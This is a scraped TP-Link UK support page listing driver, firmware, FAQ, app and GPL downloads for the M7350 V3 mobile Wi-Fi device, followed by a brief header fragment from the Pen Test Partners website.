=== Content from www.tp-link.com_650a6c58_20250121_001749.html ===


Your browser does not support JavaScript. Please turn it on for the best experience.

Click to skip the navigation bar

[Support](/uk/support/)

1. [All Support](/uk/support/)
2. [Download Center](/uk/support/download/)
3. [FAQs](/uk/support/faq/)
4. [TP-Link Community](https://community.tp-link.com)
5. [Contact Technical Support](/uk/support/contact-technical-support/#LiveChat-Support)
6. [Compatibility List](/uk/support/compatibility-list/)

[Where to Buy](/uk/where-to-buy/)

[Promotions](/uk/promotion/)

[Community](https://community.tp-link.com)

1. [For Home](https://community.tp-link.com/en/home)
2. [For Smart Home](https://community.tp-link.com/en/smart-home)
3. [For Business](https://community.tp-link.com/en/business)

[United Kingdom / English](/uk/choose-your-location/)

[TP-Link, Reliably Smart](/uk/)

[Search](/uk/search/)
[Online store](https://ukstore.tp-link.com/?utm_source=tplink&utm_medium=home&utm_campaign=nav_icon)

* [Store
  ![Click to open the navigation bar](https://static.tp-link.com/assets/images/icon/arrow-gray-down.svg)](https://uk.store.tapo.com/)
* Home
  ![Click to open the navigation bar](https://static.tp-link.com/assets/images/icon/arrow-gray-down.svg)
  + [Wi-Fi 7](/uk/wifi7/)
  + [HomeCare](/uk/homecare/)
  + [VPN](/uk/technology/vpn/)
  + [Deco Mesh](/uk/whole-home-mesh/)
  + [EasyMesh](/uk/easymesh/)
  + [OneMesh](/uk/onemesh/)
  + [G.hn](/uk/ghn/)

  [Whole Home Wi-Fi](/uk/whole-home-mesh/)

  Wi-Fi for the whole home

  + [Deco](/uk/home-networking/deco/)

  [Routers](/uk/explore/wifi-router/)

  Create a fast and reliable Wi-Fi

  + [Wi-Fi 7 Routers](/uk/home-networking/wifi-router/?filterby=6271)
  + [Wi-Fi 6E Routers](/uk/home-networking/wifi-router/?filterby=6093)
  + [WiFi Router](/uk/home-networking/wifi-router/)

  [Modems/ Gateways](/uk/home-networking/all-gateways/)

  Your doorway to the internet

  + [DSL Modems & Routers](/uk/home-networking/dsl-modem-router/)
  + [5G/4G Routers](/uk/home-networking/5g-4g-router/)
  + [SOHO Routers](/uk/home-networking/soho-router/)

  [Network Expansion](/uk/home-networking/all-network-expansion/)

  Easy ways to expand and enhance your network

  + [Powerline Adapters](/uk/home-networking/powerline/)
  + [Range Extenders](/uk/home-networking/range-extender/)
  + [Access Points](/uk/home-networking/access-point/)
  + [SOHO Switches](/uk/home-networking/soho-switch/)

  [SOHO Switches](/uk/home-networking/soho-switch/)

  Keeping your home wired for quality connections

  + [5-Port Switches](/uk/home-networking/soho-switch/?filterby=4996)
  + [8-Port Switches](/uk/home-networking/soho-switch/?filterby=5889)
  + [16-Port Switches](/uk/home-networking/soho-switch/?filterby=5890)

  [Travel Routers](/uk/home-networking/mifi/)

  WiFi on the go

  + [Travel Routers](/uk/home-networking/3g-usb-adapter/)
  + [Mobile Wi-Fi](/uk/home-networking/mifi/)

  [Adapters](/uk/home-networking/all-adapter/)

  Equip your devices for a faster Wi-Fi

  + [WiFi Adapter](/uk/home-networking/adapter/)
  + [USB Ethernet Adapters](/uk/home-networking/usb-ethernet-adapter/)
  + [High Gain Adapter](/uk/home-networking/high-gain-adapter/)
  + [High Power Adapters](/uk/home-networking/high-power-adapter/)
  + [PCIe Adapters](/uk/home-networking/pci-adapter/)

  [Accessories](/uk/home-networking/all-accessories/)

  Everything else you need for a connected lifestyle

  + [Charging](/uk/home-networking/mobile-accessory/)
  + [USB-C Hub & Converters](/uk/home-networking/all-accessories/#usb-c-hub-&-converters)
  + [Computer Accessories](/uk/home-networking/computer-accessory/)
  + [Antennas](/uk/home-networking/antenna/)
  + [Bluetooth Music Receiver](/uk/home-networking/entertainment-device/)
  + [Car Accessories](/uk/home-networking/car-accessory/)
  + [Power Banks](/uk/home-networking/power-bank/)
  + [USB Hubs](/uk/home-networking/usb-hub/)
  + [USB Converters](/uk/home-networking/usb-converter/)

  [Home Office Networking](/uk/business-networking/all-soho/)

  The easy-to-ues solution for Home Office networking

  + [SOHO Switches](/uk/business-networking/all-soho-switch/)
  + [Festa Networking Solution](/uk/landing/festa/)
  + [Unmanaged Switches](/uk/business-networking/soho-switch-unmanaged/)
  + [Easy Smart Switches](/uk/business-networking/soho-switch-easy-smart/)
  + [Load Balance Gateways](/uk/business-networking/soho-router/)
  + [Pharos Wireless Bridges](/uk/business-networking/all-pharos-wireless-bridge/)
* Smart Home
  ![Click to open the navigation bar](https://static.tp-link.com/assets/images/icon/arrow-gray-down.svg)
  + [Kasa Smart Home](https://www.tp-link.com/uk/smarthome/)
  + [Tapo Smart](https://www.tapo.com/uk/)
  + [Matter](/uk/technology/matter/)

  [Smart Bulbs](/uk/home-networking/smart-bulb/)

  Light for every occasion

  [Smart Plugs](/uk/home-networking/smart-plug/)

  Smarten up your home devices

  [Cameras](/uk/home-networking/cloud-camera/)

  Keeping an eye on what matters

  [Smart Switches](/uk/home-networking/smart-switch/)

  More than just on and off

  [Smart Sensors](/uk/smart-home/smart-sensor/)

  Worry-free home automation

  [Smart Hub](/uk/home-networking/smart-hub/)

  Seamlessly connect everything

  [Smart Thermostat](/uk/home-networking/smart-thermostat/)

  Everyday's comfort and savings

  [Smart Robot Vacuums](/uk/smart-home/all-robot-vacuum/)

  Everyday cleaning made easy

  + [Robot Vacuums](/uk/smart-home/robot-vacuum/)
  + [Robot Vacuum Accessories](/uk/smart-home/robot-vacuum-accessory/)

  [Accessories](/uk/home-networking/smarthome-accessory/)

  Extensions of the smart home
* [BUSINESS
  ![Click to open the navigation bar](https://static.tp-link.com/assets/images/icon/arrow-gray-down.svg)](https://www.omadanetworks.com/uk/)

  [Omada](/uk/business-networking/all-omada/)

  The cloud networking solutions for small and medium business

  + [What is Omada?](/uk/omada-sdn/)
  + [WiFi](/uk/business-networking/omada/wifi/)
  + [Switches](/uk/business-networking/omada/switch/)
  + [Gateways](/uk/business-networking/omada/router/)
  + [Controllers](/uk/business-networking/omada/controller/)
  + [Accessories](/uk/business-networking/omada/accessory/)
  + [All Products](/uk/omada/)

  [VIGI](https://www.vigi.com/uk/)

  The smart surveillance solution for small and medium business

  + [What is VIGI?](https://www.vigi.com/uk/vigi/about-vigi/)
  + [VIGI 4E Principle](https://www.vigi.com/uk/vigi/vigi-4e-principle/)
  + [Cameras](https://www.vigi.com/uk/business-networking/vigi-network-camera/)
  + [Video Recorders](https://www.vigi.com/uk/business-networking/vigi-network-video-recorder/)
  + [Solar Power System](https://www.vigi.com/uk/business-networking/vigi-solar-power-system/)
  + [Accessories](https://www.vigi.com/uk/business-networking/vigi-accessory/)
  + [Software Service](https://www.vigi.com/uk/business-networking/vigi-software-service/)
  + [VIGI Tools](https://www.vigi.com/uk/smb/vigi-tool/)
  + [All Products](https://www.vigi.com/uk/business-networking/all-vigi-surveillance/)

  [Festa](/uk/landing/festa/)

  The Networking Solution Built for Small Businesses and Prosumers

  + [What is Festa?](/uk/landing/festa/)
  + [WiFi](/uk/business-networking/soho-festa-access-point/)
  + [Switches](/uk/business-networking/soho-festa-switch/)
  + [Gateways](/uk/business-networking/soho-festa-gateway/)
  + [Cloud](/uk/business-networking/soho-festa-cloud/)
  + [All Products](/uk/business-networking/all-soho-festa/)

  [More Products](/uk/business-networking/all-soho/)

  The easy-to-use solution for SOHO networking

  + [Festa](/uk/business-networking/all-soho-festa/)
  + [Switches](/uk/business-networking/all-soho-switch/)
  + [Pharos Wireless Bridges](/uk/business-networking/all-pharos-wireless-bridge/)
* [SERVICE PROVIDER
  ![Click to open the navigation bar](https://static.tp-link.com/assets/images/icon/arrow-gray-down.svg)](https://service-provider.tp-link.com)
  + [Service Provider](https://service-provider.tp-link.com/)
  + [Agile Solutions](https://service-provider.tp-link.com/uk/aginet-solution/)
  + [ISP Tools](/uk/solution/isp-tools/)

  [Wi-Fi Router](/uk/service-provider/wifi-router/)

  The reliable choice for home networking

  [Mesh WiFi](/uk/service-provider/home-wifi-system/)

  A seamless, intelligent and easy-to-configure mesh network

  [VDSL](/uk/service-provider/vdsl/)

  Capable of high-speed network and integrated broadband applications

  [GPON](/uk/service-provider/gpon/)

  The leading technology for delivering gigabit Internet services

  4G/5G

  Maintains internet access wherever you go.

  + [4G/5G Router](/uk/service-provider/lte-router/)
  + [LTE MiFi](/uk/service-provider/lte-mifi/)

[TP-Link, Reliably Smart](/uk/)

[Search](/uk/search/)
[Online store](https://ukstore.tp-link.com/?utm_source=tplink&utm_medium=home&utm_campaign=nav_icon)
Menu

Submit

* [Store](https://uk.store.tapo.com/)
* Home

  Back

  + Whole Home Wi-Fi

    - [Deco](/uk/home-networking/deco/)
  + Routers

    - [Recommended Routers](/uk/explore/wifi-router/)
    - [Wi-Fi 7 Routers](/uk/home-networking/wifi-router/?filterby=6271)
    - [Wi-Fi 6E Routers](/uk/home-networking/wifi-router/?filterby=6093)
    - [WiFi Router](/uk/home-networking/wifi-router/)
  + Modems/ Gateways

    - [DSL Modems & Routers](/uk/home-networking/dsl-modem-router/)
    - [5G/4G Routers](/uk/home-networking/5g-4g-router/)
    - [SOHO Routers](/uk/home-networking/soho-router/)
  + Network Expansion

    - [Powerline Adapters](/uk/home-networking/powerline/)
    - [Range Extenders](/uk/home-networking/range-extender/)
    - [Access Points](/uk/home-networking/access-point/)
    - [SOHO Switches](/uk/home-networking/soho-switch/)
  + SOHO Switches

    - [5-Port Switches](/uk/home-networking/soho-switch/?filterby=4996)
    - [8-Port Switches](/uk/home-networking/soho-switch/?filterby=5889)
    - [16-Port Switches](/uk/home-networking/soho-switch/?filterby=5890)
  + Travel Routers

    - [Travel Routers](/uk/home-networking/3g-usb-adapter/)
    - [Mobile Wi-Fi](/uk/home-networking/mifi/)
  + Adapters

    - [WiFi Adapter](/uk/home-networking/adapter/)
    - [USB Ethernet Adapters](/uk/home-networking/usb-ethernet-adapter/)
    - [High Gain Adapter](/uk/home-networking/high-gain-adapter/)
    - [High Power Adapters](/uk/home-networking/high-power-adapter/)
    - [PCIe Adapters](/uk/home-networking/pci-adapter/)
  + Accessories

    - [Charging](/uk/home-networking/mobile-accessory/)
    - [USB-C Hub & Converters](/uk/home-networking/all-accessories/#usb-c-hub-&-converters)
    - [Computer Accessories](/uk/home-networking/computer-accessory/)
    - [Antennas](/uk/home-networking/antenna/)
    - [Bluetooth Music Receiver](/uk/home-networking/entertainment-device/)
    - [Car Accessories](/uk/home-networking/car-accessory/)
    - [Power Banks](/uk/home-networking/power-bank/)
    - [USB Hubs](/uk/home-networking/usb-hub/)
    - [USB Converters](/uk/home-networking/usb-converter/)
  + Home Office Networking

    - [SOHO Switches](/uk/business-networking/all-soho-switch/)
    - [Festa Networking Solution](/uk/landing/festa/)
    - [Unmanaged Switches](/uk/business-networking/soho-switch-unmanaged/)
    - [Easy Smart Switches](/uk/business-networking/soho-switch-easy-smart/)
    - [Load Balance Gateways](/uk/business-networking/soho-router/)
    - [Pharos Wireless Bridges](/uk/business-networking/all-pharos-wireless-bridge/)
  + [Wi-Fi 7](/uk/wifi7/)
  + [HomeCare](/uk/homecare/)
  + [VPN](/uk/technology/vpn/)
  + [Deco Mesh](/uk/whole-home-mesh/)
  + [EasyMesh](/uk/easymesh/)
  + [OneMesh](/uk/onemesh/)
  + [G.hn](/uk/ghn/)
* Smart Home

  Back

  + [Smart Bulbs](/uk/home-networking/smart-bulb/)
  + [Smart Plugs](/uk/home-networking/smart-plug/)
  + [Cameras](/uk/home-networking/cloud-camera/)
  + [Smart Switches](/uk/home-networking/smart-switch/)
  + [Smart Sensors](/uk/smart-home/smart-sensor/)
  + [Smart Hub](/uk/home-networking/smart-hub/)
  + [Smart Thermostat](/uk/home-networking/smart-thermostat/)
  + Smart Robot Vacuums

    - [Robot Vacuums](/uk/smart-home/robot-vacuum/)
    - [Robot Vacuum Accessories](/uk/smart-home/robot-vacuum-accessory/)
  + [Accessories](/uk/home-networking/smarthome-accessory/)
  + [Kasa Smart Home](https://www.tp-link.com/uk/smarthome/)
  + [Tapo Smart](https://www.tapo.com/uk/)
  + [Matter](/uk/technology/matter/)
* BUSINESS

  Back

  + Omada

    - [What is Omada?](/uk/omada-sdn/)
    - [WiFi](/uk/business-networking/omada/wifi/)
    - [Switches](/uk/business-networking/omada/switch/)
    - [Gateways](/uk/business-networking/omada/router/)
    - [Controllers](/uk/business-networking/omada/controller/)
    - [Accessories](/uk/business-networking/omada/accessory/)
    - [All Products](/uk/omada/)
  + VIGI

    - [What is VIGI?](https://www.vigi.com/uk/vigi/about-vigi/)
    - [VIGI 4E Principle](https://www.vigi.com/uk/vigi/vigi-4e-principle/)
    - [Cameras](https://www.vigi.com/uk/business-networking/vigi-network-camera/)
    - [Video Recorders](https://www.vigi.com/uk/business-networking/vigi-network-video-recorder/)
    - [Solar Power System](https://www.vigi.com/uk/business-networking/vigi-solar-power-system/)
    - [Accessories](https://www.vigi.com/uk/business-networking/vigi-accessory/)
    - [Software Service](https://www.vigi.com/uk/business-networking/vigi-software-service/)
    - [VIGI Tools](https://www.vigi.com/uk/smb/vigi-tool/)
    - [All Products](https://www.vigi.com/uk/business-networking/all-vigi-surveillance/)
  + Festa

    - [What is Festa?](/uk/landing/festa/)
    - [WiFi](/uk/business-networking/soho-festa-access-point/)
    - [Switches](/uk/business-networking/soho-festa-switch/)
    - [Gateways](/uk/business-networking/soho-festa-gateway/)
    - [Cloud](/uk/business-networking/soho-festa-cloud/)
    - [All Products](/uk/business-networking/all-soho-festa/)
  + More Products

    - [Festa](/uk/business-networking/all-soho-festa/)
    - [Switches](/uk/business-networking/all-soho-switch/)
    - [Pharos Wireless Bridges](/uk/business-networking/all-pharos-wireless-bridge/)
* SERVICE PROVIDER

  Back

  + [Wi-Fi Router](/uk/service-provider/wifi-router/)
  + [Mesh WiFi](/uk/service-provider/home-wifi-system/)
  + [VDSL](/uk/service-provider/vdsl/)
  + [GPON](/uk/service-provider/gpon/)
  + 4G/5G

    - [4G/5G Router](/uk/service-provider/lte-router/)
    - [LTE MiFi](/uk/service-provider/lte-mifi/)
  + [Service Provider](https://service-provider.tp-link.com/)
  + [Agile Solutions](https://service-provider.tp-link.com/uk/aginet-solution/)
  + [ISP Tools](/uk/solution/isp-tools/)
* Support

  Back

  + [All Support](/uk/support/)
  + [Download Center](/uk/support/download/)
  + [FAQs](/uk/support/faq/)
  + [TP-Link Community](https://community.tp-link.com)
  + [Contact Technical Support](/uk/support/contact-technical-support/#LiveChat-Support)
  + [Compatibility List](/uk/support/compatibility-list/)
  + [Replacement & Warranty](/uk/support/replacement-warranty/)
  + [TP-Link Emulators](/uk/support/emulator/)
  + [GPL Code Center](/uk/support/gpl-code/)
  + [Agile Config 2.0 Download](https://agile.tp-link.com/uk)
  + [PSTI Statement](/uk/support/psti/)
* [Where to Buy](/uk/where-to-buy/)
* [Promotions](/uk/promotion/)
* Community

  Back

  + [For Home](https://community.tp-link.com/en/home)
  + [For Smart Home](https://community.tp-link.com/en/smart-home)
  + [For Business](https://community.tp-link.com/en/business)

+ [omada](https://www.omadanetworks.com/uk/)
+ [VIGI](https://www.vigi.com/uk/)
+ [kasa](https://uk.store.tapo.com/pages/kasa-thermostatic?utm_source=tplink&utm_medium=home&utm_campaign=kasa_icon)
+ [tapo](https://www.tapo.com/uk/)
+ [aginet](https://aginet.tp-link.com/)

* [Download Center](/uk/support/download/)
* [FAQs](/uk/support/faq/)
* [TP-Link Community](https://community.tp-link.com)
* [Contact Technical Support](/uk/support/contact-technical-support/#LiveChat-Support)
* [Compatibility List](/uk/support/compatibility-list/)
* [Replacement & Warranty](/uk/support/replacement-warranty/)
* [TP-Link Emulators](/uk/support/emulator/)
* [GPL Code Center](/uk/support/gpl-code/)
* [Agile Config 2.0 Download](https://agile.tp-link.com/uk)
* [PSTI Statement](/uk/support/psti/)

# *Download for* *M7350 V3*

Please choose hardware version:
V3

* [V9](https://www.tp-link.com/uk/support/download/m7350/v9/)
* [V8](https://www.tp-link.com/uk/support/download/m7350/v8/)
* [V7](https://www.tp-link.com/uk/support/download/m7350/v7/)
* [V6.20](https://www.tp-link.com/uk/support/download/m7350/v6.20/)
* [V5](https://www.tp-link.com/uk/support/download/m7350/v5/)
* [V4](https://www.tp-link.com/uk/support/download/m7350/v4/)
* [V3.20](https://www.tp-link.com/uk/support/download/m7350/v3.20/)
* [V3](https://www.tp-link.com/uk/support/download/m7350/v3/)
* [V2](https://www.tp-link.com/uk/support/download/m7350/v2/)
* [V1](https://www.tp-link.com/uk/support/download/m7350/v1/)

[>How to find the hardware version on a TP-Link device](/uk/support/faq/46/)

**IMPORTANT**:
Model and hardware version availability varies by region. Please refer to your TP-Link regional website to determine product availability.
Product Overview

* [M7350\_V3\_Datasheet](https://static.tp-link.com/res/down/doc/M7350_V3_Datasheet.pdf)

Manual

* [M7350(EU)\_V3\_UG](https://static.tp-link.com/res/down/doc/M7350%28EU%29_V3_UG.pdf)
* [M7350(UN)\_V3\_QIG](https://static.tp-link.com/res/down/doc/M7350%28UN%29_V3_QIG.pdf)

[*![](https://static.tp-link.com/M7350_1497944810588r.JPG)*

M7350](/uk/products/details/m7350.html)

* Driver
* FAQ
* Firmware
* Apps
* GPL Code
* Emulators

## Driver

| M7350\_V3\_Driver\_XP | | [Download](https://static.tp-link.com/res/down/soft/M7350_V3_Driver_XP.zip) |
| --- | --- | --- |
| Published Date: 2016-07-05 | Language:  English | File Size: 1 KB |
| Operating System: Win XP | | |
| Notes:  For M7350 V3 | | |

*Feature Filter:*
All
TroubleshootingUser Application RequirementQ&A of functional explanation or specification parametersWhen You Set UpConfiguration Guide

## FAQs

* [What should I do if the email shows that the link expired when I register cloud account or reset my password?](/uk/support/faq/4113/)
  08-02-202419324
* [4G 5G Routers (Including Deco, LTE Gateway and MiFi) have no Internet due to 464XLAT technology used by some operators (e.g., Jio, Globe)](/uk/support/faq/4091/)
  07-22-202415053
* [How to Reset TP-Link Mobile Wi-Fi Devices to Factory Defaults](/uk/support/faq/3730/)
  09-20-202370790
* [The Weak Security and Privacy Warning on the iOS14 or iOS15](/uk/support/faq/2943/)
  06-25-2023450145
* [What should I do if my TP-Link Mobile Wi-Fi cannot detect SIM card?](/uk/support/faq/3487/)
  06-20-202360041
* [How to check the 4G band working on our smartphones](/uk/support/faq/3488/)
  06-20-202390371
* [What should I do if my TP-Link Mobile Wi-Fi product label with default wireless password is lost or damaged?](/uk/support/faq/3621/)
  04-07-202344705
* [How to troubleshoot if there is no internet connection when using 4G Mobile Wi-Fi(Case 2)](/uk/support/faq/795/)
  02-13-2023267276
* [Troubleshooting Guide of Wi-Fi disconnecting issue on TP-Link MiFi devices](/uk/support/faq/3416/)
  08-23-2022116529
* [How to access Internet via USB cable with 4G Mobile Wi-Fi](/uk/support/faq/758/)
  06-28-2022161996
* [How to upgrade the firmware of 4G Mobile Wi-Fi](/uk/support/faq/760/)
  06-28-2022158178
* [How to login to the M7350’s web management page](/uk/support/faq/783/)
  06-28-2022301494
* [How to configure Data Settings of 4G Mobile Wi-Fi](/uk/support/faq/790/)
  06-28-2022165902
* [How to troubleshoot if there is no internet connection when using 4G Mobile Wi-Fi(Case 1)](/uk/support/faq/794/)
  06-28-2022478672
* [How to block unknown devices by tpMiFi](/uk/support/faq/1129/)
  06-28-202270415
* [How to send SMS by tpMiFi](/uk/support/faq/1131/)
  06-28-202296481
* [How to set data usage limit by tpMiFi](/uk/support/faq/1132/)
  06-28-202267477
* [How to use SD sharing function by tpMiFi](/uk/support/faq/1133/)
  06-28-202260035
* [Why does my TP-Link Mobile Wi-Fi device run out of battery quite fast and how to fix it?](/uk/support/faq/3362/)
  04-22-202250851
* [What are the most frequent asked questions about the 4G Mobile Wi-Fi?](/uk/support/faq/793/)
  04-22-202290066
* [How do I install a SIM card for my 4G Wi-Fi router or Mobile Wi-Fi?](/uk/support/faq/3196/)
  09-24-2021345077
* [Why my devices fail to detect the wireless signal of the Mobile Wi-Fi suddenly?](/uk/support/faq/1130/)
  08-05-202187362
* [What should I do when one of the following messages appears on the screen or I cannot access the internet? (Mobile Wi-Fi with screen)](/uk/support/faq/1973/)
  08-30-201989223
* [What should I do if I failed to log in on tpMiFi App?](/uk/support/faq/2577/)
  08-21-201969164
* [What should I do if PIN is required when I first connect to Mobile WiFi’s wireless network?](/uk/support/faq/2054/)
  01-16-2018196109
* [How to use MiFi in foreign countries?](/uk/support/faq/1355/)
  12-02-2016165192
* [How to access the micro SD card of 4G Mobile Wi-Fi via wireless](/uk/support/faq/759/)
  03-23-2016136848
* [What can I do with the two buttons and screen of M7350?](/uk/support/faq/761/)
  09-10-201557207

## Firmware

A firmware update can resolve issues that the previous firmware version may have and improve its current performance.

## To Upgrade

**IMPORTANT:** To prevent upgrade failures, please read the following before proceeding with the upgrade process

* **Please upgrade firmware from the local TP-Link official website of the purchase location for your TP-Link device, otherwise it will be against the warranty. Please click [here](/choose-your-location/) to change site if necessary.**
* Please verify the hardware version of your device for the firmware version. Wrong firmware upgrade may damage your device and void the warranty.

  [How to find the hardware version on a TP-Link device](/uk/support/faq/46/)
* **Do NOT turn off the power during the upgrade process, as it may cause permanent damage to the product.**
* To avoid wireless disconnect issue during firmware upgrade process, it's recommended to upload firmware with wired connection unless there is no LAN/Ethernet port on your TP-Link device.
* It's recommended that users stop all Internet applications on the computer, or simply disconnect Internet line from the device before the upgrade.
* Use decompression software such as WinZIP or WinRAR to extract the file you download before the upgrade.

More
Fold

| M7350(EU)\_V3\_190531 | | [Download](https://static.tp-link.com/2019/201912/20191209/M7350%28EU%29_V3_190531.zip) |
| --- | --- | --- |
| Published Date: 2019-06-03 | Language:  English | File Size: 28.47 MB |
| Fix some security vulnerabilities. | | |

| M7350(EU)\_V3\_160330 | | [Download](https://static.tp-link.com/M7350%28EU%29_V3_160330_1472438334613t.zip) |
| --- | --- | --- |
| Published Date: 2016-03-30 | Language:  English | File Size: 47.29 MB |
| Modifications and Bug Fixes:  New Feathres/Enhancement: 1.Update to EU,cancelled the Region option 2.Updated the ISPs in Singapore  Notes:  1. For M7350(EU)\_V3 2. Your device's configuration won't be lost after upgrading. 3. You will be NOT able to downgrade to the previous firmware after upgrading to this version. | | |

| M7350\_V3\_151021 | | [Download](https://static.tp-link.com/res/down/soft/M7350_V3_151021.zip) |
| --- | --- | --- |
| Published Date: 2015-10-21 | Language:  English | File Size: 47 MB |
| Modifications and Bug Fixes:  Update ISP information in regions below:Greece,Austria,Singapore,Azerbaijan,Cyprus,Russia,New Caledonia.  Notes:  For M7350\_V3 | | |

## To Use Third Party Firmware In TP-Link Products

Some official firmware of TP-Link products can be replaced by the third party firmware such as DD-WRT. TP-Link is not obligated to provide any maintenance or support for it, and does not guarantee the performance and stability of third party firmware. Damage to the product as a result of using third party firmware will void the product's warranty.

## Open Source Code For Programmers (GPL)

Please note: The products of TP-Link partly contain software code developed by third parties, including software code subject to the GNU General Public Licence (“GPL“), Version 1/Version 2/Version 3 or GNU Lesser General Public License ("LGPL"). You may use the respective software condition to following the GPL licence terms.

You can review, print and download the respective GPL licence terms [here](https://static.tp-link.com/resources/document/GPL%20License%20Terms.pdf). You receive the GPL source codes of the respective software used in TP-Link products for direct download and further information, including a list of TP-Link software that contain GPL software code under [GPL Code Center](/uk/support/gpl-code/).

The respective programs are distributed WITHOUT ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the respective GNU General Public License for more details.

## Apps

![](https://static.tp-link.com/res/style/images/tpMiFi-App-Icon.png)
tpMiFi App
tpMiFi provides the easiest way to access and manage your 4G MiFi product with your iOS or Android devices.

![](https://static.tp-link.com/res/images/qrcode/app-tp-mifi.png)

* [![tpMiFi App Android APP download](https://static.tp-link.com/res/style/images/android_en.png)](https://play.google.com/store/apps/details?id=com.tplink.tpmifi)
* [![tpMiFi App IOS APP download](https://static.tp-link.com/res/style/images/ios_en.svg)](https://itunes.apple.com/us/app/tpmifi/id999189880?mt=8)

## GPL Code

* [GPL\_M7350\_V3](https://static.tp-link.com/resources/gpl/M7350v3_en_gpl.tar.gz)

## Emulators

| Firmware Version | Working Mode | Language |  |
| --- | --- | --- | --- |
| 141126 | - | English | [Browse](https://emulator.tp-link.com/M7350%28UN%29_simulator/login.html) |

**Note:**

1.  The emulator is a virtual web GUI where you can experience the TP-Link product management panel.

2. The listed emulators might not have the latest firmware.

3.  The features displayed are for reference, and their availability may depend on local regulations. For more information, please refer to the datasheet or product page.

## Sign up for news & offers>TP-Link takes your privacy seriously. For further details on TP-Link's privacy practices, see [TP-Link's Privacy Policy](https://privacy.tp-link.com/web/official/privacy-policy?region=GB) **TP-Link understands your time is valuable and waiting for an agent to address your concern can daunting at times, so to help we also provide helpful [FAQs](https://www.tp-link.com/support/faq/) , [Videos](https://www.tp-link.com/support/setup-video/) and a [Community Forum](https://community.tp-link.com/en) that can help you solve most concerns without ever having to pick up a phone, [join a chat](https://www.tp-link.com/support/contact-technical-support/#LiveChat-Support) or send an email.**

Email Address

Email Error

Sign Up

For Home Networking

For Smart Home

For Business

I would like to be kept up to date with TP-Link news, product updates and promotions.

By clicking 'Sign Up' you confirm that you understand and agree to our [Privacy Policy](https://privacy.tp-link.com/web/official/privacy-policy?region=GB).

reCaptcha not verified

Sign Up

## Follow Us

* [www.facebook.com](https://www.facebook.com/TPLINKUK/)
* [www.youtube.com](https://www.youtube.com/user/TPLINKTECH)
* [www.linkedin.com](https://www.linkedin.com/company/tplink-uk/)
* [twitter.com](https://twitter.com/TPLINKUK?lang=en)
* [www.amazon.com](https://www.amazon.co.uk/stores/TP-Link/page/EAFE46A8-55BD-48A8-A8F2-37A135614A29?ref_=ast_bln，icon)
* [www.instagram.com](https://www.instagram.com/tplinkuk/)

About

* [Contact Us](/uk/about-us/contact/)
* [About Us](/uk/about/about-us/)
* [Our Security Commitment](/uk/landing/security-commitment/)
* [Sustainability](/uk/sustainability/)
* [Careers at TP-Link](/uk/about-us/career/)
* [Cookie Policy](https://privacy.tp-link.com/web/cookie/policy)
* [Privacy Policy](https://privacy.tp-link.com/web/official/privacy-policy?region=GB)
* [Modern Slavery Act](https://static.tp-link.com/upload/certificates/2024/202404/20240425/Modern%20slavery%20policy%20statement%20-%20April%202024.pdf)
* [Tax Strategy](https://static.tp-link.com/file/uk/2023%20Tax%20Strategy_TP-LINK.pdf)

Press

* [News](/uk/press/news/)
* [Awards](/uk/press/award/)
* [Security Advisory](/uk/press/security-advisory/)
* [Press Releases](/uk/press/press-release/)
* [Blog](/uk/blog/)

[Where to Buy](/uk/where-to-buy/)

* [Online Stores](/uk/where-to-buy/#Online Stores)
* [Retail](/uk/where-to-buy/#Retail)
* [Distributors](/uk/where-to-buy/#Distributors)
* [VAR Partner](/uk/where-to-buy/#VAR Partner)

Partners

* [Partner Programme](https://partner.tp-link.com/uk/)
* [Network Site Survey](/uk/wifi-survey/)
* [Technology Library](/uk/learning-center/)

* [![tp-link](https://static.tp-link.com/upload/menu/tp-link_20231205034128d.png)](https://www.tp-link.com/uk/)
* ![kasa](https://static.tp-link.com/upload/menu/kasa_20231205034427x.png)
* [![tapo](https://static.tp-link.com/upload/menu/tapo_20231205034542j.png)](https://www.tapo.com/uk/)
* [![omada](https://static.tp-link.com/upload/menu/omada_20231205034833a.png)](https://www.omadanetworks.com/uk/)
* [![vigi](https://static.tp-link.com/upload/menu/vigi_20231205034600w.png)](https://www.vigi.com/uk/)

Copyright © 2025 TP-Link UK Limited. All rights reserved.

[United Kingdom / English](/uk/choose-your-location/)

This website uses cookies to improve website navigation, analyze online activities and have the best possible user experience on our website. You can object to the use of cookies at any time. You can find more information in our  [privacy policy](https://privacy.tp-link.com/web/official/privacy-policy?region=GB) .

Cookie Settings
Accept All Cookies

This website uses cookies to improve website navigation, analyze online activities and have the best possible user experience on our website. You can object to the use of cookies at any time. You can find more information in our  [privacy policy](https://privacy.tp-link.com/web/official/privacy-policy?region=GB) .

Basic Cookies

These cookies are necessary for the website to function and cannot be deactivated in your systems.

TP-Link

accepted\_local\_switcher, tp\_privacy\_base, tp\_privacy\_marketing, tp\_smb-select-product\_scence, tp\_smb-select-product\_scenceSimple, tp\_smb-select-product\_userChoice, tp\_smb-select-product\_userChoiceSimple, tp\_smb-select-product\_userInfo, tp\_smb-select-product\_userInfoSimple, tp\_top-banner, tp\_popup-bottom, tp\_popup-center, tp\_popup-right-middle, tp\_popup-right-bottom, tp\_productCategoryType

Livechat

\_\_livechat, \_\_lc2\_cid, \_\_lc2\_cst, \_\_lc\_cid, \_\_lc\_cst, CASID

Youtube

id, VISITOR\_INFO1\_LIVE, LOGIN\_INFO, SIDCC, SAPISID, APISID, SSID, SID, YSC, \_\_Secure-1PSID, \_\_Secure-1PAPISID, \_\_Secure-1PSIDCC, \_\_Secure-3PSID, \_\_Secure-3PAPISID, \_\_Secure-3PSIDCC, 1P\_JAR, AEC, NID, OTZ

Analysis and Marketing Cookies

Analysis cookies enable us to analyze your activities on our website in order to improve and adapt the functionality of our website.

The marketing cookies can be set through our website by our advertising partners in order to create a profile of your interests and to show you relevant advertisements on other websites.

Google Analytics & Google Tag Manager

\_gid, \_ga\_<container-id>, \_ga, \_gat\_gtag\_<container-id>

Google Ads & DoubleClick

test\_cookie, \_gcl\_au

Meta Pixel

\_fbp

Crazy Egg

cebsp\_, \_ce.s, \_ce.clock\_data, \_ce.clock\_event, cebs

Linkedin

lidc, AnalyticsSyncHistory, UserMatchHistory, bcookie, li\_sugr, ln\_or

Accept All Cookies
Save Settings



=== Content from www.pentestpartners.com_17b476fc_20250121_001747.html ===


[![Pen Test Partners Logo](https://www.pentestpartners.com/content/themes/pentestpartners2019/dist/images/logo-ptp.png)

Security consulting and testing services](https://www.pentestpartners.com)

+44 20 3095 0500

+1 646 693 2501

* [About](https://www.pentestpartners.com/about-us/)
